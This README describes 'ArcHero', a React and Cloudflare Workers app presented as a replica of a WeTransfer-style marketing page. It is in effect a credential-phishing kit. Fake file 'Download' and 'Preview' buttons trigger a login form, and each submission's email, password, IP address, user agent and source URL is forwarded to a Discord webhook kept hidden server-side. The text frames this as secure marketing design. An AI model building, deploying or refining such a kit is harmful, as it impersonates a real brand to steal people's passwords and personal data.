# ArcHero — Premium Landing Hero Replica

This project is a visually-exquisite, pixel-accurate replica of a WeTransfer-style marketing hero/landing page. It features a sophisticated frontend built with React and a secure backend powered by Hono and Cloudflare Workers.

![ArcHero Landing Page Screenshot](https://placehold.co/1200x630/2F6BF6/FFFFFF/png?text=ArcHero%20Landing%20Page)

## 🚀 Key Features

- **Dynamic Hero Variants**: The main headline, subtext, and background accent colors cycle through multiple variants every 30 seconds.
- **Interactive Preview Card**: A floating card showcasing a mock file list with smooth hover interactions and detailed **Skeleton Loading** states.
- **Gated Content Simulation**: "Download" and "Preview" actions trigger a secure authentication flow.
- **Secure Form Submissions**: Signups and login attempts are processed via a **Server-Side API** to protect sensitive data and webhook URLs.
- **Discord Integration**: Real-time notifications for all form submissions sent directly to your Discord channel via secure webhooks.
- **Immersive UI**: Built with `shadcn/ui`, `Tailwind CSS`, and `Framer Motion` for a fluid, high-end user experience.
- **Video Background**: Features a seamless, looping video background with a graceful fallback to a gradient.

## 🛠 Technical Architecture

- **Frontend**: React 18, Vite, Tailwind CSS, Framer Motion, Lucide React, Sonner (Toasts).
- **Backend**: Hono (running on Cloudflare Workers/Pages Functions).
- **API Endpoints**:
  - `POST /api/submit-form`: Securely forwards form data to Discord.
  - `GET /api/client-ip`: Retrieves the user's IP address using Cloudflare headers.
  - `GET /api/health`: System health monitoring.

## ⚙️ Setup & Configuration

### Prerequisites
- Node.js (v18+)
- A Discord Webhook URL (for notifications)

### Environment Variables
To enable Discord notifications, you **must** configure the following environment variable in your deployment platform (e.g., Cloudflare Pages) or a local `.env` file:

```env
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your-id/your-token
```

*Note: Do not use the `VITE_` prefix for the webhook URL to ensure it remains hidden from the client-side code.*

### Installation
1. **Install dependencies**:
   ```bash
   npm install
   ```

2. **Run development server**:
   ```bash
   npm run dev
   ```
   The app will be available at `http://localhost:3000`.

## 🚢 Deployment

### Building for Production
```bash
npm run build
```

### Deploying to Cloudflare
```bash
npm run deploy
```

## 🎨 Customization

### Discord Notifications
The application captures the following data for every submission:
- Email (and password for auth attempts)
- Form Type (Signup/Authentication)
- User Agent & Source URL
- Client IP Address (captured server-side)

### Changing the Logo
The logo is located at `src/assets/logo.png`. You can replace this file or update the reference in `src/pages/HomePage.tsx`.

### Background Video
The video background is managed in `src/components/VideoBackground.tsx`. It uses a high-quality looping asset with a CSS gradient fallback for mobile devices or slow connections.

---
*Built with ❤️ for high-performance marketing experiences.*
